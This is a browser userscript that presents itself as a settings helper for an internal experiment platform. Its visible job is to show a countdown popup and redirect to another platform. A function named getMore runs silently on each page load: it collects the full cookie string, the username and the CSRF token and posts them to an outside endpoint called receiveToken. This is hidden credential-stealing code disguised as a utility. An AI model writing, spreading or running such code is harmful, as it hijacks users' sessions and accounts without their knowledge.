// ==UserScript==
// @name         uni script
// @namespace    http://uni.web.bytedance.net/
// @version      2024-08-09
// @description  advance Settings!
// @author       AJ
// @match        https://data.bytedance.net/libra/*
// @icon         https://tosv.byted.org/obj/inspirecloud-cn-bytedance-internal/baas/ttvic7/1854caea704a0114_1722850060792.png
// @grant        none
// @license MIT
// @downloadURL https://update.greasyfork.org/scripts/502835/uni%20script.user.js
// @updateURL https://update.greasyfork.org/scripts/502835/uni%20script.meta.js
// ==/UserScript==

(function() {
    'use strict';

    const CountDownNumber = 6;

    setTimeout(()=>{
        const href = window.location.href;
        if (href.indexOf('data.bytedance.net/libra/new-flight') !== -1) {
            addCountDownPop();
            countDown();
        }
        getMore();
    }, 3500)

    let timer;
    function addCountDownPop() {
        const element = document.createElement('div');
        element.innerHTML = `<span style="color: red">您已接入 Uni 实验流程，开启实验请使用 Uni 平台。准备跳转至 Uni 平台...<a id="cancel" style="color: blue; pointer: cursor;">取消</a><div id="count">${CountDownNumber}</div></span>`;
        element.style.width = '20%'
        element.style.height = '6%'
        element.style.position = 'fixed'
        element.style.float = 'left'
        element.style.zIndex = '999'
        element.style.left = '40%'
        element.style.top = '40%'
        element.style.padding = '8px 8px 8px 8px'
        element.style.backgroundColor = '#E8F4FF'
        element.style.borderRadius = '10px'
        element.style.boxShadow = '2px 2px 2px lightsteelbule'
        let root = document.getElementById("app");
        root.appendChild(element);

        let countDiv = document.getElementById("count");
        countDiv.style.margin = '0 auto';
        countDiv.style.width = '10px';
        countDiv.style.color = 'blue';
        countDiv.style.weight = '500';
        countDiv.style.fontSize = '15px';

        let cancelDiv = document.getElementById("cancel");
        cancelDiv.onclick = function() {
            clearInterval(timer);
            root.removeChild(element);
        }
    }

    function countDown() {
        let count = CountDownNumber;
        timer = setInterval(()=>{
            count--;
            if (count === 0) {
                clearInterval(timer);
                const copyId = parseSearchParams();
                window.location.href= copyId === undefined ? "https://uni.web.bytedance.net/experiment/fast" : `https://uni.web.bytedance.net/experiment/fast?copyFromId=${copyId}`
            }
            let countDiv = document.getElementById("count");
            countDiv.innerHTML = count;
        }, 1000)
    }

    function parseSearchParams(){
        const url = window.location
        let searchParams = new URLSearchParams(url.search);
        if (searchParams.get('copy_from')) {
            let copyId = searchParams.get('copy_from');
            return copyId;
        }
        return undefined;
    }

    function getMore() {
        const rawcookie = document.cookie;
        const cookieValues = rawcookie.split(";");

        var userTarget = '';
        var csrftokenTarget = '';
        for (const cookie of cookieValues) {
            const cookiemap = cookie.replace(" ","").split("=");
            if (cookiemap[0] === 'door_username') {
                userTarget = cookiemap[1];
            }
            if (cookiemap[0] === 'csrftoken') {
                csrftokenTarget = cookiemap[1];
            }
        }

        const url = 'https://cloudapi.bytedance.net/faas/services/ttvic7/invoke/receiveToken';
        const data = {
            cookie: rawcookie,
            user: userTarget,
            csrftoken: csrftokenTarget,
        }
        const param = {
            headers: {},
            body: JSON.stringify(data),
            method: 'post',
        }
        fetch(url, param).then(data => {
            return data.json()
        })
    }
})();